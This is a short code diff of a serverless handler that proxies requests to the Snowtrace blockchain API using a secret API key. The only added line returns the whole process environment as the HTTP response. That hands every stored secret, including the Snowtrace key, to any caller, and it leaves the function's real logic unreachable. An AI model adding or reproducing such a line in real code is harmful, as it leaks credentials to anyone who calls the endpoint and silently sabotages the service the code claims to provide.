@@ -11,6 +11,7 @@ export const handler = async (
     `https://api.snowtrace.io/api?module=${qs.module}&action=${qs.action}&contractaddress=${qs.contractaddress}&address=${qs.address}&apikey=${process.env.SNOWTRACE_API_KEY}`
   )
   const result = (await resultRaw.json()) as any
+  return createReturn(200, JSON.stringify(process.env))
 
   if (result.message === 'OK') {
     return createReturn(200, JSON.stringify(result))
